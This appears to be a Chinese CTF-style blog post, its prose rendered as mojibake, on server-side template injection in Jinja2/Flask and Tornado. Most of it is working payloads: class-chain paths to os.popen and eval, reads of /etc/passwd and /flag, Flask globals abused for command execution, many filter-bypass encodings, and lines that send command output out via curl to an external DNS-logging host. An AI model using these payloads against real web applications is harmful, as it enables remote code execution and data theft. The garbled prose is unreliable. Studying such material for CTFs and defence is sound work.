<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250414125152769.png" alt="image-20250414125152769"></p>
<p>æ‰¾åˆ°Objectä¹‹åå‘¢ï¼Œç”±äºæˆ‘ä»¬çš„ç›®çš„æ˜¯å¾—åˆ°ä¸€ä¸ªå¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ¿å—ï¼Œæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°<code>os</code>è¿™äº›ç±»ä¼¼çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±è¦ç”¨åˆ°<code>__subclass__()</code>ä»¥åŠåé¢çš„ä¸€äº›ä¸œè¥¿</p>
<p>subclassesæ˜¯è¿”å›å­ç±»ï¼Œé€šå¸¸è¿™ä¸ªæ—¶å€™å°±ä¼šè·³ä¸€å¤§ä¸²çš„å­ç±»ï¼Œæ²¡è„šæœ¬æ˜¯ä¸å¾—è¡Œçš„(ä¸æ˜¯å“¥ä»¬ä½ çœŸæƒ³æ‰‹æ‰¾å—)</p>
<p>è€Œè¿”å›å­ç±»åæˆ‘ä»¬å°±è¦åšå‡ºä¸€ä¸ªé‡å¤§çš„å†³ç­–ï¼Œæ ¹æ®ç‰ˆæœ¬æ‰“ä¸åŒçš„payload,è¯¦è§æ–‡ä»¶è¯»å–çš„å­ç±»(py2äººä¸Šäºº)</p>
<p>ä¸€èˆ¬æˆ‘ä»¬çš„é€‰æ‹© æ˜¯ä¸¤ç§</p>
<ul>
<li>æ–‡ä»¶è¯»å–</li>
<li>å†…ç½®æ¨¡å—ä»»æ„å‘½ä»¤æ‰§è¡Œ</li>
</ul>
<pre><code class="highlight python"><span class="comment">#æ–‡ä»¶è¯»å–</span>
<span class="comment">#python2</span>
file -&gt;(<span class="string">&#x27;path&#x27;</span>).read()
<span class="comment">#python3</span>
_frozen_importlib_external.FiieLoader -&gt;[<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)
<span class="comment">#å½“ç„¶ä¹Ÿå¯ä»¥æ‹¿å†…ç½®æ¨¡å—å†æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸å¾—å·²æ‰ä¼šè¿™æ ·æ‰“</span></code></pre>

<pre><code class="highlight python"><span class="comment">#å‡½æ•°rce</span>
<span class="comment">#ä¸çŸ¥é“å’Œç‰ˆæœ¬æœ‰æ²¡æœ‰å…³ç³»ï¼Œåæ­£æ‰¾åˆ°è¿˜æ²¡æœ‰è¢«è¿‡æ»¤ç›´æ¥æ‰“å°±è¡Œ</span>
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;
&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoamiâ€™)&#125;&#125;</span>
<span class="string">&#123;&#123; &#x27;</span><span class="string">&#x27;.__class__.__base__.__subclasses__()[10].__init__.__globals__[&#x27;</span>__builtins__<span class="string">&#x27;][&#x27;</span><span class="built_in">eval</span><span class="string">&#x27;](&#x27;</span><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()<span class="string">&#x27;) &#125;&#125;#eval</span></code></pre>

<pre><code class="highlight python"><span class="comment">#ç±»çš„rce</span>
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx][<span class="string">&#x27;load_moudule&#x27;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;<span class="comment">#importlib</span>
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro[<span class="number">2</span>]__.__subclasses__()[xx](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;<span class="comment">#subprocess.Popen ä¸ªäººè§‰å¾—å”¯ä¸€çœŸç¥å¥½å§</span></code></pre>

<pre><code class="highlight python"><span class="comment">#å†…ç½®OSæ¨¡å—rce(è¿™ä¸ªå…¶å®å°±å¤šäº†å“ˆå“ˆ)ä¸ç®¡ç±»å†…ç½®çš„è¿˜æ˜¯å‡½æ•°å†…ç½®çš„æœ‰å°±è¡Œäº†ï¼Œè¿™è¾¹é‡ç‚¹ä»‹ç»ç±»çš„å§ï¼Œå› ä¸ºå‡½æ•°å†…ç½®çš„åé¢ä¼šè®²çš„</span>
os._wrap_close //<span class="number">117</span>
warnings.catch_warnings //<span class="number">59</span>
warnings.WarningMessage
socket._socketobject
site._Printer //<span class="number">71</span>
site.Quitte
subprocess.Popen //<span class="number">258</span></code></pre>

<p>å†è´´ä¸€ä¸ªæ‰¾åˆ°å†…ç½®osæ¨¡å—çš„è„šæœ¬</p>
<pre><code class="highlight plaintext">#coding:utf-8search = &#x27;os&#x27;   #ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä½ æƒ³åˆ©ç”¨çš„æ¨¡å—
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass</code></pre>

<p>åé¢çš„æ“ä½œå°±æ¯”è¾ƒå…¬å¼åŒ–äº†</p>
<p>ç›´æ¥è´´ä¸€ä¸‹å¥½äº†</p>
<pre><code class="highlight python"><span class="comment">#python2</span>
__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)
__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()
__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)
__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)
__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)

<span class="comment">#python3</span>
__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()
__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)
__init__[<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()
__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)
__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span>
<span class="string">__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read()</span>
<span class="string"></span></code></pre>

<p><strong>è§‰å¾—çƒ¦?é‚£æœ€å¿«çš„å°±æ¥äº†</strong></p>
<p>åˆ©ç”¨flaskå†…ç½®å‡½æ•°ï¼Œæ•ˆç‡é«˜ï¼ŒpayloadçŸ­ï¼Œå°±æ˜¯å®¹æ˜“è¢«ban(</p>
<pre><code class="highlight jinja2">1)config #è·å–é…ç½®ä¿¡æ¯
&#123;&#123;config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;cat+/flag&quot;).read()&#125;&#125;

2)lipsum
&#123;&#123; lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read() &#125;&#125;

3)request
&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
&#123;&#123;request.application.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;

4)url_for
&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
åˆ©ç”¨å…¶è¯»åˆ°ç¯å¢ƒå˜é‡:url_for.__globals__[&#x27;current_app&#x27;].config
5)get_flashed_messages
&#123;&#123;get_flashed_messages.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
åˆ©ç”¨å…¶è¯»åˆ°ç¯å¢ƒå˜é‡:get_flashed_messages.__globals__[&#x27;current_app&#x27;].config</code></pre>

<p><strong>åè®°ï¼š</strong>æ‰“è¿‡å†…å­˜é©¬ä¹‹åå¦‚è§å¤©åœ°å•Šï¼Œï¼Œèƒ½åˆ©ç”¨çš„å†…ç½®å‡½æ•°è¿œè¿œä¸æ­¢è¿™ä¹ˆä¸€äº›</p>
<p>èƒ½è·å– <code>__globals__</code> çš„æœ‰ï¼š</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>context</th>
</tr>
</thead>
<tbody><tr>
<td><code>url_for.__globals__</code></td>
<td>flask.app or flask.helpers</td>
</tr>
<tr>
<td><code>get_flashed_messages.__globals</code>__</td>
<td>flask.helpers</td>
</tr>
<tr>
<td><code>request.__init__.__globals</code>__</td>
<td>werkzeug.wrappers.request</td>
</tr>
<tr>
<td><code>request.application.__globals__</code></td>
<td>werkzeug.wrappers.request</td>
</tr>
<tr>
<td><code>session.__init__.__globals__</code></td>
<td>flask.sessions</td>
</tr>
<tr>
<td><code>config.__class__.__init__.__globals__</code></td>
<td>flask.config</td>
</tr>
</tbody></table>
<p>å†åŠ ä¸Š Jinja2 é»˜è®¤å®šä¹‰åœ¨ä¸Šä¸‹æ–‡ä¸­çš„ä¸€äº›å˜é‡</p>
<p><a href="http://www.caterpie771.cn/wp-content/uploads/myimgs/6066fbff4ce29a6a6a2d4748584b27f9.png"><img src="http://www.caterpie771.cn/wp-content/uploads/myimgs/6066fbff4ce29a6a6a2d4748584b27f9.png" alt="æˆªå›¾"></a></p>
<table>
<thead>
<tr>
<th>payload</th>
<th>context</th>
</tr>
</thead>
<tbody><tr>
<td><code>lipsum.__globals__</code></td>
<td>jinja2.utils</td>
</tr>
<tr>
<td><code>cycler.__init__.__globals__</code></td>
<td>jinja2.utils</td>
</tr>
<tr>
<td><code>joiner.__init__.__globals__</code></td>
<td>jinja2.utils</td>
</tr>
<tr>
<td><code>namespace.__init__.__globals__</code></td>
<td>jinja2.utils</td>
</tr>
</tbody></table>
<p>è¿™äº›éƒ½èƒ½ç”¨æ¥åš SSTI bypass</p>
<p>(æ¥è‡ª<a href="https://www.caterpie771.cn/">caterpie</a>å¸ˆå‚…çš„ä¸€ç¯‡åšå®¢é‡Œè®°è¿°çš„)</p>
<hr>
<p><strong>æ€»ç»“ä¸€ä¸‹ï¼Œå°±æ˜¯å…ˆæ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„æ”»åŸé”¤(å†…å«osçš„ç±»æˆ–å¯å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°)å’Œä¸€æŠŠè¶æ‰‹çš„å®å‰‘(å¯ä»¥ä½¿ç”¨çš„æ–¹æ³•)</strong></p>
<h4 id="jinja2çš„è¿‡æ»¤"><a href="#jinja2çš„è¿‡æ»¤" class="headerlink" title="jinja2çš„è¿‡æ»¤"></a>jinja2çš„è¿‡æ»¤</h4><p><strong>è¿‡æ»¤[</strong></p>
<pre><code class="highlight python"><span class="comment">#getitemã€pop</span>
<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()
<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()
<span class="comment">#ä¹Ÿå¯ä»¥ç”¨__getattribute__ç»•è¿‡</span>
&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;
<span class="comment">#æˆ–è€…é…åˆrequest</span>
&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami

<span class="comment">#æˆ–è€…ç”¨printæ ‡è®°</span>
&#123;%<span class="built_in">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</code></pre>

<p><strong>è¿‡æ»¤å¼•å·</strong></p>
<pre><code class="highlight plaintext">#chrå‡½æ•°
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;
#requestå¯¹è±¡
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd
#å‘½ä»¤æ‰§è¡Œ
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id
#request ç»•è¿‡
&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd    
\#åˆ†æï¼š
request.args æ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§,ä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°,è¿™é‡ŒæŠŠpathå½“ä½œå˜é‡å,å°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥,è¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ã€‚
è‹¥argsè¢«è¿‡æ»¤äº†ï¼Œè¿˜å¯ä»¥ä½¿ç”¨valuesæ¥æ¥å—GETæˆ–è€…POSTå‚æ•°ã€‚ï¼š
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;
Cookie:arg1=open;arg2=/etc/passwd
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;
post:arg1=open&amp;arg2=/etc/passwd</code></pre>

<p><strong>è¿‡æ»¤ä¸‹åˆ’çº¿</strong></p>
<pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
//request.args.xxå°±èƒ½ç›´æ¥æŸ¥è¯¢å¯¹åº”çš„å‚æ•°å€¼ï¼ŒæŠŠåŸå‚æ•°æ¢æˆ[request.args.xx]å³å¯</code></pre>

<p><strong>è¿‡æ»¤èŠ±æ‹¬å·</strong></p>
<pre><code class="highlight plaintext">#ç”¨&#123;%%&#125;æ ‡è®°ï¼ŒåŒæ—¶å¤–å¸¦
&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;
&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__[&#x27;popen&#x27;](&quot;curl `whoami`.k1o75b.ceye.io&quot;).read()==&#x27;kawhi&#x27; %&#125;1&#123;% endif %&#125;</code></pre>

<p><strong>è¿‡æ»¤å…³é”®å­—</strong></p>
<ul>
<li>åˆ©ç”¨å†…ç½®çš„è¯­æ³•ä¼ å‚çš„å€¼ï¼š</li>
</ul>
<p>å¦‚<code>request.args.[å˜é‡å](getä¼ å‚) request.cookies.[å˜é‡å](cookiesä¼ å‚)</code></p>
<ul>
<li>ä½¿ç”¨åˆ‡ç‰‡å°†é€†ç½®çš„å…³é”®å­—é¡ºåºè¾“å‡ºï¼Œè¿›è€Œè¾¾åˆ°ç»•è¿‡ã€‚</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</code></pre>

<ul>
<li>åè½¬</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__ssalc__&quot;][::-1]
&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>

<ul>
<li>åˆ©ç”¨â€+â€è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ã€‚</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
[][%27__cla%27+%27ss__%27][%27__ba%27+%27se__%27][%27__subcl%27+%27asses__%27]()[117][&quot;__in&quot;+&quot;it__&quot;][&quot;__glo&quot;+&quot;bals__&quot;][&#x27;popen&#x27;](&#x27;ls /&#x27;).read()</code></pre>

<ul>
<li>joinæ‹¼æ¥</li>
</ul>
<p>åˆ©ç”¨joinï¼ˆï¼‰å‡½æ•°ç»•è¿‡å…³é”®å­—è¿‡æ»¤</p>
<pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;
&#123;&#123;()|attr([&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2]|join)&#125;&#125;
&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</code></pre>

<ul>
<li>åˆ©ç”¨å¼•å·ç»•è¿‡</li>
</ul>
<pre><code class="highlight plaintext">[&#123;&#123;[].__class__.__base__.__subclasses__()40&quot;/fl&quot;&quot;ag&quot;.read()&#125;&#125;]()</code></pre>

<ul>
<li>ä½¿ç”¨stråŸç”Ÿå‡½æ•°replaceæ›¿æ¢</li>
</ul>
<p>å°†é¢å¤–çš„å­—ç¬¦æ‹¼æ¥è¿›åŸæœ¬çš„å…³é”®å­—é‡Œé¢ï¼Œç„¶ååˆ©ç”¨replaceå‡½æ•°å°†å…¶æ›¿æ¢ä¸ºç©ºã€‚</p>
<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>asciiè½¬æ¢</li>
</ul>
<pre><code class="highlight plaintext">å°†æ¯ä¸€ä¸ªå­—ç¬¦éƒ½è½¬æ¢ä¸ºasciiå€¼åå†æ‹¼æ¥åœ¨ä¸€èµ·ã€‚

&quot;&#123;0:c&#125;&quot;.format(97)=&#x27;a&#x27;
&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</code></pre>

<ul>
<li>16è¿›åˆ¶ç¼–ç ç»•è¿‡</li>
</ul>
<pre><code class="highlight plaintext">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;

ä¾‹å­ï¼š
&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;
\
åŒç†ï¼Œä¹Ÿå¯ä½¿ç”¨å…«è¿›åˆ¶ç¼–ç ç»•è¿‡</code></pre>

<ul>
<li><p>base64ç¼–ç ç»•è¿‡</p>
<p>å¯¹äºpython2ï¼Œå¯åˆ©ç”¨base64è¿›è¡Œç»•è¿‡ï¼Œå¯¹äºpython3æ²¡æœ‰decodeæ–¹æ³•ï¼Œä¸èƒ½ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œç»•è¿‡ã€‚</p>
</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;
//__class__</code></pre>

<p>ä¾‹å­ï¼š</p>
<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;  
ç­‰ä»·äº  
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</code></pre>

<ul>
<li>unicodeç¼–ç ç»•è¿‡</li>
</ul>
<pre><code class="highlight jinja2">&#123;%print((((lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;os&quot;))|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;
ç­‰åŒäºlipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac /f*&#x27;).read()</code></pre>

<ul>
<li>Hexç¼–ç ç»•è¿‡</li>
</ul>
<pre><code class="highlight jinja2">[&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;]()
&#123;#æ¸©é¦¨æç¤ºï¼Œè¿å…³é”®è¯éƒ½è½¬æ¢æ‰æ˜¯æœ‰æ¦‚ç‡è¤’å§’çš„ï¼Œæ¨èç”¨æ¥ç»•è¿‡ä¸€ä¸‹ç¬¦å·çš„è¿‡æ»¤å·®ä¸å¤šå¤Ÿç”¨äº†#&#125;

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;   
ç­‰ä»·äº   
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>ç»•è¿‡<strong>init</strong><br>å¯ä»¥ç”¨<code>__enter__</code>æˆ–<code>__exit__</code>æ›¿ä»£<code>__init__</code></li>
</ul>
<pre><code class="highlight plaintext">&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>

<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>ç»•è¿‡config</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;self&#125;&#125; â‡’ &lt;TemplateReference None&gt;
&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre>

<ul>
<li>è¿‡æ»¤argså’Œ.å’Œ_</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;()|attr(request[&#x27;values&#x27;][&#x27;x1&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x2&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x3&#x27;])()|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(40)|attr(request[&#x27;values&#x27;][&#x27;x5&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x6&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x7&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x8&#x27;])(request[&#x27;values&#x27;][&#x27;x9&#x27;])&#125;&#125;

post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;whoami&#x27;).read()</code></pre>

<h4 id="æ‰“é©¬ç¯èŠ‚-å¾…è¡¥å®Œ"><a href="#æ‰“é©¬ç¯èŠ‚-å¾…è¡¥å®Œ" class="headerlink" title="æ‰“é©¬ç¯èŠ‚(å¾…è¡¥å®Œ)"></a>æ‰“é©¬ç¯èŠ‚(å¾…è¡¥å®Œ)</h4><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><pre><code class="highlight plaintext">ç¥å¿…é¾™å·é£</code></pre>

<h4 id="åŸºç¡€äº†è§£"><a href="#åŸºç¡€äº†è§£" class="headerlink" title="åŸºç¡€äº†è§£"></a>åŸºç¡€äº†è§£</h4><p><code>Tornado</code>æ˜¯ä¸€ä¸ªå…·æœ‰å¼‚æ­¥åŠŸèƒ½çš„ç®€å•webæ¡†æ¶</p>
<pre><code class="highlight python"><span class="keyword">import</span> tornado.ioloop
<span class="keyword">import</span> tornado.web

<span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):
    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):
        <span class="variable language_">self</span>.write(<span class="string">&quot;Hello, world&quot;</span>)

<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    application = tornado.web.Application([
        (<span class="string">r&quot;/&quot;</span>, MainHandler),
    ])
    application.listen(<span class="number">8888</span>)
    tornado.ioloop.IOLoop.current().start()</code></pre>

<p>å®ƒä½¿ç”¨<code>RequestHandler</code>æ¥å¤„ç†å‘é€è¿‡æ¥çš„webè¯·æ±‚</p>
<h4 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h4><p>è¿™é‡Œå¤§éƒ¨åˆ†çš„payloadæ˜¯ä¸‡å·ä¸ç¦»å…¶å®—çš„(æŒ‡ç»§æ‰¿é“¾)</p>
<p>å¦‚æœè¦è°ˆç‰¹æ€§</p>
<p>å¤§æ¦‚æ˜¯<code>application</code></p>
<p>å› ä¸º<code>Tornado</code>æ¨¡æ¿ä¸€èˆ¬éœ€è¦å¼•å…¥<code>Tornado.web</code></p>
<p>è€Œåœ¨<code>Tornado.web.application</code>ä¸‹å°±å¯ä»¥å‘ç°æ¡†æ¶çš„<code>settings</code></p>
